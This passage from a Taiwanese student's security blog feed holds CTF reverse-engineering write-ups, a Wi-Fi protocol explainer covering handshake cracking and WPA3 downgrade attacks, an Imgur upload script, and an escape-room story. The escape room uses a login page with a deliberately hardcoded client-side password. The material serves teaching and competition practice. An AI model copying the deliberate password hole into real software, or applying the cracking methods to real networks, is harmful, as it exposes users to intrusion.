(<span class="hljs-number">64</span> - rot))) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>                <span class="hljs-comment"># Convert to 8 ASCII chars (little-endian)</span>        chars = <span class="hljs-string">""</span>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):            byte_val = (decrypted &gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>            chars += <span class="hljs-built_in">chr</span>(byte_val)                flag += chars        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Block <span class="hljs-subst">{i}</span>: 0x<span class="hljs-subst">{decrypted:016X}</span> -&gt; '<span class="hljs-subst">{chars}</span>'"</span>)        <span class="hljs-built_in">print</span>()    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🎯 FLAG: <span class="hljs-subst">{flag}</span>"</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)        <span class="hljs-keyword">return</span> flag<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    wasm_flag_extractor()</code></pre><p>Flag：<code>AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}</code></p><h3 id="A-simple-snake-game"><a href="#A-simple-snake-game" class="headerlink" title="A_simple_snake_game"></a>A_simple_snake_game</h3><h4 id="題目-11"><a href="#題目-11" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Here is A very interesting Snake game. If no one beat this game the world will be destory in 30 seconds. Now, Chenallger , It’s your duty to beat the game, save the world.</p><p>author: Aukro</p></blockquote><h4 id="Writeup-11"><a href="#Writeup-11" class="headerlink" title="Writeup"></a>Writeup</h4><p>在主函式中看到多個函式名稱包含 <code>draw</code> 字串</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image25.webp" alt="Screenshot 2025-06-05 at 00.06.06"></p><p>嘗試搜尋其他與 <code>draw</code> 有關的函式。看到有一個 <code>drawText</code> 函式，看起來就很會畫 Flag</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image26.webp" alt="Screenshot 2025-06-05 at 00.06.19"></p><p>查看程式邏輯，發現一個判斷式，看起來平常都只會執行到 True 的地方，False 的地方應該就和 Flag 脫不了關係</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image27.webp" alt="Screenshot 2025-06-05 at 00.06.40"></p><p>在判斷前下斷點</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image28.webp" alt="Screenshot 2025-06-05 at 00.07.42"></p><p>執行到斷點後使其跳轉至 False 的地方</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image29.webp" alt="Screenshot 2025-06-05 at 00.08.06"></p><p>然後就拿到 Flag 了！</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image30.webp" alt="Screenshot 2025-06-05 at 00.08.29"></p><p>Flag：<code>AIS3{CH3aT_Eng1n3?_Ofcau53_I_bo_1T_by_hAnD}</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Competition </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高中職跨校資安社團 社團交流活動舉辦紀錄與心得</title>
      <link href="/2025/03/01/2025-Zeroday-c00kie-winter-event/"/>
      <url>/2025/03/01/2025-Zeroday-c00kie-winter-event/</url>
      
        <content type="html"><![CDATA[<p><img src="/posts/2025-Zeroday-c00kie-winter-event/image.webp"></p><p>我是教育部高中職資安教學資源與推廣中心的高中職跨校社團 ZeroDay C00kies 零日餅乾社幹部，同時也是這次活動的副召。</p><p>為了促進社員間的互動、交流及成長，於 2025 年 1 月 23 日（沒錯，遲發了一個多月 XD）在臺北市立復興高級中學舉辦社團的社團交流活動。在這篇文章中，將呈現活動籌備、活動進行以及最後的總結和反思等內容。</p><p>根據先前的經驗總結，考量到社員的能力差距大，本次活動希望以促進交流並提升興趣為目標，透過遊戲化的方式設計整日的活動。</p><h2 id="籌備"><a href="#籌備" class="headerlink" title="籌備"></a>籌備</h2><p>在活動籌備前期，異想天開的我們希望在一天的活動當中，塞入破冰遊戲、專題報告製作、密室逃脫遊戲等內容。p.s. 想了解資安密室逃脫的讀者可以看看我之前寫的心得：<em><strong><a href="https://1ping.org/?page=2025-Cybersecurity-escape-room">當資安遇上密室逃脫：一群高中生以資安為主題製作密室逃脫的故事</a></strong></em>。</p><p>經過討論與調整後，最終決定在上午 2 小時的時間利用「海龜湯」進行破冰的遊戲（絕對沒有抄襲 2024 AIS3 Club 🤫），以促進社員間的互動與熱忱；下午因考量到專題報告製作需耗費大量的時間，因此改以較容易控制時間的「世界咖啡館」為主軸進行活動設計；而原先的密室逃脫因為一些原因導致無法順利安排，因此在活動日的一個禮拜前，我們積極討論並提出了「資安病毒遊戲」的替代方案，此遊戲是借鑑韓國的一黨遊戲綜藝節目《魔鬼的計謀》。</p><p>因此次我主要負責「世界咖啡館」的部分，所以「海龜湯」和「資安病毒遊戲」的詳細紀錄請見總召寫的心得：<em><strong><a href="https://medium.com/@tong33/%E7%AC%AC-n-%E6%AC%A1%E6%88%90%E7%82%BA%E7%B8%BD%E5%8F%AC-37f025cc3ffb">第 N 次成為總召…</a></strong></em></p><h2 id="活動進行：世界咖啡館"><a href="#活動進行：世界咖啡館" class="headerlink" title="活動進行：世界咖啡館"></a>活動進行：世界咖啡館</h2><p>世界咖啡館是一種討論的模式，透過讓參與者多次的換組討論議題，促進知識與想法的交流。在世界咖啡館中，通常會將活動參與者分為多個小組（每組約 4–6 人），並在各組桌上鋪大張紙、便利貼及筆等書寫用具，組員需利用每一輪約 10–30 分鐘的時間針對設定好的議題進行討論，並可隨時將想法和點子記錄下來。世界咖啡廳營造輕鬆的討論氣氛，促進活動參與者放鬆的思考並表達想法，且多個議題能夠同時進行討論，因此在某些意義上也是一種「咖啡館」。p.s. 但不一定有咖啡或茶點喔！別失望了～</p><p>本次活動希望透過安排以資安主題為主軸的世界咖啡館，使社員間能夠互相學習和交流，其討論的議題涵蓋「資安有哪些學習管道？」、「資安有哪些社群管道？」、「資安技術」、「資安防範」、「資安推廣和提倡」、「資安案例分享」等 6 項。</p><p><img src="/posts/2025-Zeroday-c00kie-winter-event/image2.webp"></p><p><img src="/posts/2025-Zeroday-c00kie-winter-event/image3.webp"></p><p>經過 6 回合的討論後，也安排了統整及報告製作的環節，利用 30–45 分鐘的時間邀請各組參與者選定議題進行統整與分類，並製作投影片準備上台報告，最後再利用 15 分鐘左右的時間讓各組能夠上台報告分享自己的統整與想法，為活動進行一個小結尾。</p><p><img src="/posts/2025-Zeroday-c00kie-winter-event/image4.webp"></p><h2 id="反思：關於活動設計"><a href="#反思：關於活動設計" class="headerlink" title="反思：關於活動設計"></a>反思：關於活動設計</h2><blockquote><p>世界咖啡館的活動進行是不是沒有按照遊戲規則進行？</p></blockquote><p>考量本次活動參與者人數較少，在遊戲的規則進行上有進行一些調整，另外也有一些沒有注意到的細節，以後若要舉辦世界咖啡館等活動，應注意盡量在每一輪討論都重新打散參與者，以促進更多人的交流和認識；在討論時，能夠讓各組參與者輪流發表想法並由其他人進行點子的紀錄，會比直接書寫便利貼更好；在這次活動中有發現，時間的安排需做一些調整，包哈減少議題的數量，以及增加報告的製作時間以確保報告的品質。</p><blockquote><p>世界咖啡館促進參與者交流、想法討論，同時增加報告製作和口頭發表的能力！</p></blockquote><p>經過本次世界咖啡館的進行後，發現世界咖啡館除了可以是活動內容的其中一部分外，也可以利用它能夠促進參與者交流的特性作為開場的破冰活動。雖然最後因為時間的關係，本次活動無法安排專題報告製作的環節，但最終各組仍產出了一份關於資安議題的報告，算是圓了我們的一點小夢吧！</p><p>透過最後的統整及發表環節，可提供機會練習現在國高中生較為欠缺的報告製作及口頭發表能力。在過程中，也有發現部分參與者會直接使用生成式 AI 工具進行內容的發想及生成，因此在活動的最後，我們也警惕大家在使用生成式 AI 工具時，應該學會如何正確的下提示詞，以及使用生成式 AI 工具應注意的相關問題。不需要「拒絕」使用生成式 AI 工具，而是應該學會如何「正確」的使用。</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>雖然因為社員的知識水平不一，導致無法舉辦純技術性的活動，但我們仍透過安排與資安相關的活動引導社員進行交流與學習。經過這次的活動，不經讓我們開始思考是否可持續舉辦以「引起對資安的興趣」或「促進交流」為目標的活動。</p><p>雖然無法如同 AIS3、AIS3 Junior 快速的提升資安技術，但仍可透過低成本的方式，舉辦資安相關活動激發國高中生對於資安的興趣，包含：各式遊戲化活動、討論性質活動等，例如：資安海龜湯、資安密室逃脫、自創遊戲、腦力激盪、世界咖啡館等。</p><p>如果有興趣舉辦相關的資安活動或有任何問題，歡迎來信詢問：<a href="mailto:sunyipingtw@icloud.com">sunyipingtw@icloud.com</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Cyber </tag>
            
            <tag> Event </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>擺脫 HackMD 圖片上傳 1MB 的限制：整合 Imgur API 到 MacOS 快速動作</title>
      <link href="/2025/02/28/2025-imgur-api-quick-action/"/>
      <url>/2025/02/28/2025-imgur-api-quick-action/</url>
      
        <content type="html"><![CDATA[<p>在使用 HackMD 時，如果要上傳一張圖片，當圖片超過 1MB 時，總會被告知無法上傳，然而一張螢幕截圖往往就超過 1MB，除了壓縮圖片犧牲畫質外，就沒有其他簡單又快速的方式嗎？</p><p>筆者使用 Imgur API 搭配 MacOS 的 Automator 應用程式，打造一個快速動作，只要對圖片「點擊右鍵」&gt;「快速動作」，就能把圖片自動上傳到 Imgur 並複製該圖片之 URL 到剪貼簿。Imgur API 提供每天可上傳 1250 張圖片，每張圖片最大可達 20MB，對於一般的使用而言，基本上是用不完的。</p><p>接下來，讓筆者帶著你/妳一起進行前置設定，並享受快速動作帶來的方便性吧！</p><hr><ol><li><p>前往 <a href="https://api.imgur.com/oauth2/addclient">https://api.imgur.com/oauth2/addclient</a></p></li><li><p>登入或註冊 Imgur 帳號</p></li><li><p>填寫表格：</p><ul><li>自訂應用程式名稱</li><li>選擇「OAuth 2 application without a callback URL」</li><li>提供電子郵件<br> <img src="https://i.imgur.com/KwNFNRM.png"></li></ul></li><li><p>提交後會獲得 Client ID，就是 API 金鑰</p></li><li><p>在 MacOS 上使用 Spotlight（cmd + 空白）搜尋「Automator」，開啟 Automator 應用程式。</p></li><li><p>新增一個「快速動作」檔案。<br> <img src="https://i.imgur.com/YPJQrVa.jpeg"></p></li><li><p>右上方各欄位分別選擇「圖片」、「任何應用程式」，並選擇自己想要的圖示。<br> <img src="https://i.imgur.com/VvPTmOd.jpeg"></p></li><li><p>在左側搜尋欄輸入「shell」並拖曳出「執行 Shell 指令」。<br> <img src="https://i.imgur.com/M0iF8Ai.png"></p></li><li><p>上方兩個下拉選單分別選擇「/bin/bash」、「作為引數」<br><img src="https://i.imgur.com/Sjo8BW2.png"></p></li><li><p>在指令區貼上下方指令，並替換上你的 API 金鑰：</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># 替換為你的 Imgur API 金鑰</span>API_KEY=<span class="hljs-string">"替換為 API 金鑰"</span><span class="hljs-comment"># 處理傳入的圖像檔案</span><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span><span class="hljs-keyword">do</span>    <span class="hljs-comment"># 顯示通知</span>    osascript -e <span class="hljs-string">"display notification \"正在上傳到 Imgur\" with title \"上傳到 Imgur\""</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"正在處理檔案: <span class="hljs-variable">$f</span>"</span>    <span class="hljs-comment"># 使用 curl 上傳圖像到 Imgur</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"開始上傳到 Imgur..."</span>    response=$(curl -s -H <span class="hljs-string">"Authorization: Client-ID <span class="hljs-variable">$API_KEY</span>"</span> -F <span class="hljs-string">"image=@<span class="hljs-variable">$f</span>"</span> https://api.imgur.com/3/image)    <span class="hljs-comment"># 檢查是否成功上傳</span>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$response</span> == *<span class="hljs-string">"success\":true"</span>* ]]; <span class="hljs-keyword">then</span>        <span class="hljs-comment"># 從回應中提取直接連結</span>        direct_link=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$response</span>"</span> | /usr/bin/python3 -c <span class="hljs-string">'import json,sys;print(json.load(sys.stdin)["data"]["link"])'</span>)        <span class="hljs-built_in">echo</span> <span class="hljs-string">"上傳成功！連結: <span class="hljs-variable">$direct_link</span>"</span>        <span class="hljs-comment"># 多種方法嘗試將連結複製到剪貼簿</span>        <span class="hljs-comment"># 方法1: 使用 pbcopy</span>        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$direct_link</span>"</span> | pbcopy        <span class="hljs-comment"># 方法2: 使用 osascript</span>        osascript -e <span class="hljs-string">"set the clipboard to \"<span class="hljs-variable">$direct_link</span>\""</span>        <span class="hljs-comment"># 方法3: 使用 Automator 變數傳遞</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$direct_link</span>"</span> &gt; /tmp/imgur_link.txt        <span class="hljs-comment"># 顯示通知</span>        osascript -e <span class="hljs-string">"display notification \"<span class="hljs-variable">$direct_link</span> 已複製到剪貼簿\" with title \"Imgur 上傳成功\""</span>    <span class="hljs-keyword">else</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">"上傳失敗。回應: <span class="hljs-variable">$response</span>"</span>        <span class="hljs-comment"># 顯示通知</span>        osascript -e <span class="hljs-string">"display notification \"上傳失敗。回應: <span class="hljs-variable">$response</span>\" with title \"Imgur 上傳失敗\""</span>    <span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span><span class="hljs-comment"># 輸出更詳細的資訊，方便排除問題</span><span class="hljs-built_in">echo</span> <span class="hljs-string">"************** 執行結果 **************"</span><span class="hljs-built_in">echo</span> <span class="hljs-string">"圖像已上傳到 Imgur"</span><span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"/tmp/imgur_link.txt"</span> ]; <span class="hljs-keyword">then</span>    final_link=$(<span class="hljs-built_in">cat</span> /tmp/imgur_link.txt)    <span class="hljs-built_in">echo</span> <span class="hljs-string">"連結: <span class="hljs-variable">$final_link</span>"</span>    <span class="hljs-comment"># 再次嘗試複製到剪貼簿</span>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$final_link</span>"</span> | pbcopy    <span class="hljs-comment"># 在結束時輸出連結，這樣可以被 Automator 的「複製到剪貼簿」動作獲取</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$final_link</span>"</span><span class="hljs-keyword">else</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"無法獲取上傳連結"</span><span class="hljs-keyword">fi</span><span class="hljs-built_in">echo</span> <span class="hljs-string">"***************************************"</span></code></pre></li><li><p>存檔並命名為「Upload to Imgur」。</p></li><li><p>接著就可以對著圖片檔「點擊右鍵」&gt;「快速動作」&gt;「Upload to Imgur」複製圖片連結。<br><img src="https://i.imgur.com/Axqa1Ka.png"></p></li></ol><hr><p>如果有任何疑問或建議，歡迎來信詢問：<a href="mailto:sunyipingtw@icloud.com">sunyipingtw@icloud.com</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搞懂 Wi-Fi 安全協議：WEP、WPA、WPA2、WPA3</title>
      <link href="/2025/02/28/2025-wifi-security/"/>
      <url>/2025/02/28/2025-wifi-security/</url>
      
        <content type="html"><![CDATA[<p>在連線 Wi-Fi 或設定家裡的 Wi-Fi Router 時，經常在安全協議的選項看到，可以選擇 WEP、WPA、WPA2、WPA3 等。他們分別代表了什麼？又存在著哪些差異呢？這篇文章將以小白的角度，簡單的描述這些安全協議的運作原理及差異。</p><p><img src="https://i.imgur.com/Gppnj6c.jpeg"></p><h2 id="什麼是-PSK？"><a href="#什麼是-PSK？" class="headerlink" title="什麼是 PSK？"></a>什麼是 PSK？</h2><p>在開始之前，我們先來認識經常與安全協議一起出現的名詞「PSK」。PSK 全名為「pre-shared key」，顧名思義就是預先分享的密碼，其實也就是我們平時登入 Wi-Fi 時，輸入的密碼。</p><h2 id="Wi-Fi-連線的四次握手"><a href="#Wi-Fi-連線的四次握手" class="headerlink" title="Wi-Fi 連線的四次握手"></a>Wi-Fi 連線的四次握手</h2><p>Wi-Fi 在連線時，會經過四次握手的連線以確保客戶端（使用者）知道 Wi-Fi 密碼（PSK），並生成安全的通訊金鑰。</p><p>如下圖所示，客戶端和 Wi-Fi 分享器（AP）會先各自生成一段隨機數，分別為「Anonce」和「Snonce」。接著客戶端與 Wi-Fi 分享器會各自將彼此生成的隨機數（共兩個）以及 Wi-Fi 分享器的密碼（PSK）進行加密演算。最後將兩方各自加密後的密文比對，即可在不傳輸 PSK 的同時，驗證客戶端是否知道 Wi-Fi 的密碼，以避免遭到攻擊者監聽獲得 PSK。</p><p><img src="https://networklessons.com/wp-content/uploads/2023/12/wpa-4-way-handshake-workflow.png" alt="image"></p><p>圖片來源：<a href="https://networklessons.com/wp-content/uploads/2023/12/wpa-4-way-handshake-workflow.png">https://networklessons.com/wp-content/uploads/2023/12/wpa-4-way-handshake-workflow.png</a></p><p>聰明的你/妳應該會發現，圖片中還有一個名詞「MIC」，它是做什麼的呢？為了避免兩端之間的傳輸遭到劫持串改，會使用彼此生成的兩隨機數（ANonce、SNonce）與 Wi-FI 密碼進行哈希運算，以確認資料並無遭到串改。如果 MIC 比對錯誤，連線就會失敗。</p><h2 id="破解-Wi-Fi-密碼"><a href="#破解-Wi-Fi-密碼" class="headerlink" title="破解 Wi-Fi 密碼"></a>破解 Wi-Fi 密碼</h2><blockquote><p>[!Warning]<br>所有內容之目的在於提升技術能力和資安意識，不得從事非法攻擊或違法行為，所有非法行為將受法律規範，切勿以身試法。詳閱刑法 358 至 363 條。</p></blockquote><p>攻擊者若想破解 Wi-Fi 密碼，需要先監聽四次握手的隨機數以及經過加密運算後的資料，接著使用密碼本離線爆破去的 PSK。</p><p><strong>WEP：</strong></p><p>WEP 是最早推出的安全協議，其使用 RC4 演算法對 PSK 和一個 24 位元的隨機數（IV）進行加密，但因為其加密演算法本身存在一些漏洞，以及 IV 僅使用 24 位元導致重複性太高（僅 16,777,216 種），攻擊者只要收集夠多重複的 IV，就能推算出 PSK，並在幾分鐘內破解。造成安全性過低，使攻擊者能夠輕易的破解取得密碼。也因為其安全性過低，目前已遭棄用。</p><p><strong>WPA：</strong></p><p>為了提高安全性發明了 WPA，它在 WEP 的基礎上增加 TKIP，雖解決了 IV 容易遭到破解的問題，但仍然使用 RC4 演算法，因此用字典檔暴力破解 PSK 的難度較 WEP 高，但仍不安全。</p><p><strong>WPA2：</strong></p><p>為了解決 RC4 演算法造成安全性過低的問題，WPA2 使用 AES 演算法。但攻擊者仍然可以透過監聽四次握手透過密碼本爆破取得密碼。以目前的硬體設備，使用密碼本僅需 5 分鐘到幾小時即可爆破成功。</p><p><strong>WPA3：</strong></p><p>在進行四次握手時，會因為遭到監聽而被攻擊者離線爆破獲得密碼，因此 WPA3 改用 SAE，而不使用四次握手，其概念與公鑰、私鑰類似，因此較難透過離線爆破密碼。</p><p>若攻擊者想要嘗試爆破，只能透過以下兩種方式：</p><ol><li>若 Wi-Fi 分享器沒有設定密碼嘗試次數的限制，可以嘗試不斷的連線 Wi-Fi 分享器爆破密碼，然而依 Wi-Fi 分享器的處理效能不同，每次連線皆需 0.1 至 0.5 秒時間。若想爆破密碼，簡單的密碼可能需要幾小時到幾天，複雜的密碼則有可能花上數十年到數世紀的時間，可見此方法基本上不可行。</li><li>降級攻擊：因為 WPA3 是 2018 年推出的安全協議，為了能夠相容所有裝置，一般在設定上會使用混合模式，也就是同時存在 WPA2 和 WPA3 兩種安全協議，因此可以透過降級攻擊將其安全等級變為 WPA2。具體方法是先斷開原始連線，並讓使用者被迫連接到假的 WPA2 安全協議的 Wi-Fi 分享器，藉此進行降級攻擊。</li></ol><h2 id="預防-Wi-Fi-密碼破解"><a href="#預防-Wi-Fi-密碼破解" class="headerlink" title="預防 Wi-Fi 密碼破解"></a>預防 Wi-Fi 密碼破解</h2><p>若你/妳是一位 Wi-Fi 分享器的管理者，要如何預防 Wi-Fi 密碼遭到破解呢？</p><ol><li>設定高強度密碼：密碼長度建議為 20 位以上，包含大小寫字母、數字和特殊符號。</li><li>關閉混合模式：2018 年後推出的電子產品基本上都支援 WPA3 的安全協議，因此應關閉混合模式並使用 WPA3。也可使用 WPA3-Enterprise，分配每位使用者帳號密碼，在遇到攻擊事件時，也較容易從紀錄檔中分析釐清責任。</li></ol><hr><p>如果有任何疑問或建議，歡迎來信詢問：<a href="mailto:sunyipingtw@icloud.com">sunyipingtw@icloud.com</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>當資安遇上密室逃脫：一群高中生以資安為主題製作密室逃脫的故事</title>
      <link href="/2025/02/12/2025-Cybersecurity-escape-room/"/>
      <url>/2025/02/12/2025-Cybersecurity-escape-room/</url>
      
        <content type="html"><![CDATA[<p><img src="/posts/2025-Cybersecurity-escape-room/image.webp"></p><p>在上學期（113–1）校內科技進階課程中，老師規劃帶領我們共同製作一場密室逃脫活動，並藉由學校期末的學習分享會活動進行展示及開放外賓遊玩體驗。在這篇文章當中，將會先介紹最終的遊玩方式，接著紀錄製作過程以及製作時遇到的各種挑戰。</p><h2 id="遊玩方式紀錄"><a href="#遊玩方式紀錄" class="headerlink" title="遊玩方式紀錄"></a>遊玩方式紀錄</h2><h3 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h3><p>玩家是一群特工，被指派任務修復造成時空扭曲的時間機器。同時這是一場資安密室逃脫，因此會融入一些資安知識以及意料之外的解謎方式。</p><h3 id="第一關"><a href="#第一關" class="headerlink" title="第一關"></a>第一關</h3><p><img src="/posts/2025-Cybersecurity-escape-room/image2.webp"></p><p>玩家會在電腦上看到一個輸入框，以及螢幕右下角的摩斯電碼（超大）便條紙，玩家需要將摩斯電碼對照桌面上的對照表解開題目，才能獲得下一關的提示，經過對照後可以得到密碼為「tschool」。在這一關當中，主要想呈現的資安觀念是，不要講密碼隨意的寫在便條紙並貼在螢幕上。</p><p>其實我們還埋了一個伏筆，這個登入介面使用前端驗證，因此玩家可以查看網頁原始碼直接看到 Hard Code 的密碼，或也可以直接看到按鈕點擊後跳到的下一個頁面，直接將其打開查看下一關的提示。</p><p>過關後會得到以下提示：</p><p><img src="/posts/2025-Cybersecurity-escape-room/image3.webp"></p><h3 id="第二關"><a href="#第二關" class="headerlink" title="第二關"></a>第二關</h3><p><img src="/posts/2025-Cybersecurity-escape-room/image4.webp"></p><p>來到第二關看到一個三位數的密碼鎖保險箱，根據上一關提供的線索「密碼好像跟時間有關」，可以猜測密碼為文件的日期，嘗試輸入密碼「213」後就成功開啟保險箱。在這關當中，主要想強調弱密碼的危害。</p><p>接著就拿到了一些道具以及一張提示卡：</p><p><img src="/posts/2025-Cybersecurity-escape-room/image5.webp"></p><h3 id="第三關"><a href="#第三關" class="headerlink" title="第三關"></a>第三關</h3><p><img src="/posts/2025-Cybersecurity-escape-room/image6.webp"></p><p>來到第三關，發現是一個密碼保險箱，依據上一關的提示「上次實驗室停電的時候箱子突然解鎖」，可以嘗試將保險箱旁的電源（行動電源）拔除，缺乏電力後密碼箱的電磁貼失效，即可開啟保險箱。</p><h3 id="第四關"><a href="#第四關" class="headerlink" title="第四關"></a>第四關</h3><p><img src="/posts/2025-Cybersecurity-escape-room/image7.webp"></p><p>來到第四關看到地上散落的指紋（RFID 磁扣）依序嘗試即可開啟保險箱，此關卡主要想表達應保護好自己的個人資料及指紋等，同時也想藉由這關表達暴力解（爆破）的概念。</p><h3 id="第五關"><a href="#第五關" class="headerlink" title="第五關"></a>第五關</h3><p><img src="/posts/2025-Cybersecurity-escape-room/image8.webp"></p><p>第五關是一個電流急急棒的遊戲，玩家需要嘗試通過電流急急棒遊戲才可以打開保險箱，然而直接通關的可能性較低。因此我們設計了一種通過的方式，玩家可以先將後方導線拔除，接著將電流急急棒移動到重點再接上導線，以表達資安競賽經常遇到的「非預期解」。</p><h3 id="修復時間機器"><a href="#修復時間機器" class="headerlink" title="修復時間機器"></a>修復時間機器</h3><p>經過五個關卡的解謎後，會得到一些道具，玩家需要嘗試將其按照提示正確的安裝，以修復時間機器。</p><p><img src="/posts/2025-Cybersecurity-escape-room/image9.webp"></p><p>機器上面有數條導線和零件需要組裝，機器上方的燈條會依據完成度進行不同的變化。</p><p><img src="/posts/2025-Cybersecurity-escape-room/image10.webp"></p><hr><h2 id="製作歷程"><a href="#製作歷程" class="headerlink" title="製作歷程"></a>製作歷程</h2><p>我在當中負責時間機器的製作，因此下方會先簡單說明一下其他關卡的製作方式，再詳細介紹時間機器在製作時的細節。</p><h3 id="登入系統"><a href="#登入系統" class="headerlink" title="登入系統"></a>登入系統</h3><p>第一關使用靜態網頁撰寫，僅包含兩個 HTML 檔，登入介面的檔案內容如下：</p><pre><code class="hljs plaintext">&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;title&gt;Password Check&lt;/title&gt;    &lt;style&gt;        body {            background-image: url("img/123.jpg");            background-size: cover;            background-blend-mode: multiply;            background-color: rgba(255, 255, 255, 0.5);            text-align: center;            background-repeat: no-repeat;            background-position: center;            background-attachment: fixed;        }        form {            width: 300px;            margin: 0 auto;            padding: 20px;            background-color: #fff;            border: 1px solid #ddd;            border-radius: 5px;            background-color: rgba(255, 255, 255, 0.75);        }        label {            display: block;            margin-bottom: 10px;        }        input[type="password"],        input[type="button"] {            width: 100%;            padding: 10px;            margin-bottom: 20px;            border: 1px solid #ccc;        }        input[type="button"] {            background-color: rgb(60, 164, 162);            color: #fff;            border: none;            cursor: pointer;        }        input[type="password"] {            margin-left: -10px;        }    &lt;/style&gt;&lt;/head&gt;&lt;body style="display: flex; align-items: center; justify-content: left; height: 100vh;"&gt;    &lt;form id="passwordForm" style="text-align: center;"&gt;        &lt;label for="password"&gt;Enter Password：&lt;/label&gt;        &lt;input type="password" id="password" name="password"&gt;        &lt;input type="button" value="Go" onclick="checkPassword()"&gt;        &lt;p&gt;破解後可以獲得實驗室的更多資料&lt;/p&gt;    &lt;/form&gt;    &lt;script&gt;        function checkPassword() {            var password = document.getElementById('password').value;            if (password === 'tschool' || password === 'Tschool') {                //！！！！！！！！！被發現了😢                alert('Password correct! Redirecting...');                window.location.href = "uu.html";            } else {                alert('Incorrect password. Please try again.');            }        }        // Add event listener for form submission        document.getElementById('passwordForm').addEventListener('submit', function(event) {            event.preventDefault(); // Prevent the form from refreshing the page            checkPassword();        });    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="雷切密碼鎖保險箱"><a href="#雷切密碼鎖保險箱" class="headerlink" title="雷切密碼鎖保險箱"></a>雷切密碼鎖保險箱</h3><p>第三關使用電磁鐵作為鎖著保險箱的關鍵。製作者在設計時，使用熱溶膠固定電磁鐵，但因電磁鐵發熱的關係，造成電磁鐵脫落；另外，也因為只使用 5V 的電磁鐵，在吸力不足的情況下，有許多玩家直接將其暴力解開（當然，因為是資安密室逃脫，所以我們也讓他過關）。</p><h3 id="指紋-RFID-保險箱"><a href="#指紋-RFID-保險箱" class="headerlink" title="指紋 RFID 保險箱"></a>指紋 RFID 保險箱</h3><p>第四關使用 RFID 感測器搭配伺服馬達製作保險箱，製作者還很貼心的設計了一張工作人員專用卡，讓密室逃脫在運行時，工作人員能夠快速的復原場地。</p><h3 id="電流急急棒保險箱"><a href="#電流急急棒保險箱" class="headerlink" title="電流急急棒保險箱"></a>電流急急棒保險箱</h3><p>第五關使用 3D 列印製作不規則的軌道，再搭配鋁箔紙包裹在外測，把手則使用鐵絲設計。</p><h3 id="時間機器製作"><a href="#時間機器製作" class="headerlink" title="時間機器製作"></a>時間機器製作</h3><p>時間機器包含一條提供數位時鐘電源的導線、三條提供燈條訊號及電源的導線、一個 DC 電源接頭能夠插上「漏斗」道具零件、一個同軸電纜接頭能夠接上天線以及一個 USB 接頭能夠接上 USB 實體安全金鑰。</p><ul><li>數位時鐘僅需正負極的電源，因此該導線使用兩孔防呆接頭供玩家連接。</li><li>燈條的三條線分別為正負極兩條以及一條訊號線，為了避免接錯造成燈條燒毀，我使用繼電器作為阻攔，並透過不同電阻值的電阻作為判斷是否連接正確的判斷依據，藉由此種方式製作出類似 Routing filters 的概念。</li><li>為了能夠判斷漏洞是否連接上，我將漏斗黏上 DC 電源接頭，並將其正負極相連，藉此製作類似開關的方式供單晶片進行判斷。</li><li>天線部分使用 3D 列印搭配鐵絲製作而成，將其黏上一條同軸電纜線，並將其中間的導線及外部的地線隔離層相連，製作與漏斗道具類似的方式進行偵測判斷。</li><li>USB 則使用樹莓派進行密鑰的判斷，最後會控制門口的無線燈條（使用 D1 mini 單晶片搭配 WS2812 燈條製作）切換顏色通關。</li></ul><hr><h2 id="挑戰與總結"><a href="#挑戰與總結" class="headerlink" 